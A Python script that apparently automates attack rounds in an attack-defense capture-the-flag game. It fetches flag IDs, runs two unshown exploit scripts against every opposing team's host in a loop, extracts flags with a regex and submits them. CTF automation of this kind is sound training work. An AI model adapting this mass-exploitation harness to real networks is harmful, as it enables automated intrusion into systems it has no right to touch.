#!/usr/bin/env python3

import json
import os
import random
import re
import requests
import subprocess


TEAM_TOKEN = os.environ['TEAM_TOKEN']

EXPLOITS = {
    'Diese-2': [
        './2-alloc-fail.py',
        './2-xor-oob.py',
    ],
}

FLAG_REGEX = re.compile(b'[0-9A-Za-z]{31}=')


def get_attack_jobs():
    jobs = []
    for service in EXPLOITS:
        r = requests.get(f'http://10.10.0.1:8081/flagIds?service={service}')
        info = r.json()[service]
        for team_id, round_flag_ids in info.items():
            host = f'10.60.{team_id}.1'
            for flag_id in round_flag_ids.values():
                jobs.append((service, host, json.dumps(flag_id)))
    return jobs


def submit_flag(flags):
    return requests.put('http://10.10.0.1:8080/flags', headers={
        'X-Team-Token': TEAM_TOKEN
    }, json=flags).text


def attack_round():
    jobs = get_attack_jobs()

    flags = set()
    for service, host, flag_id in jobs:
        exploit = random.choice(EXPLOITS[service])
        print(f'Attack {host} / {service} on flag ID "{flag_id}" with {exploit}')
        try:
            proc = subprocess.run([exploit, host, flag_id],
                                  stdout=subprocess.PIPE,
                                  timeout=30, check=True)
            new_flags = set(FLAG_REGEX.findall(proc.stdout))
            if new_flags:
                for flag in new_flags:
                    flag = flag.decode()
                    print(f'    Got flag: {flag}')
                    flags.add(flag)
        except Exception as e:
            print(f'    Error: {e}')

    print('Submitting flags...')
    result = submit_flag(list(flags))
    print(f'    Result: {result}')


def main():
    while True:
        print('--- Begin attack round ---')
        attack_round()
        print('--- End attack round ---')


if __name__ == '__main__':
    main()
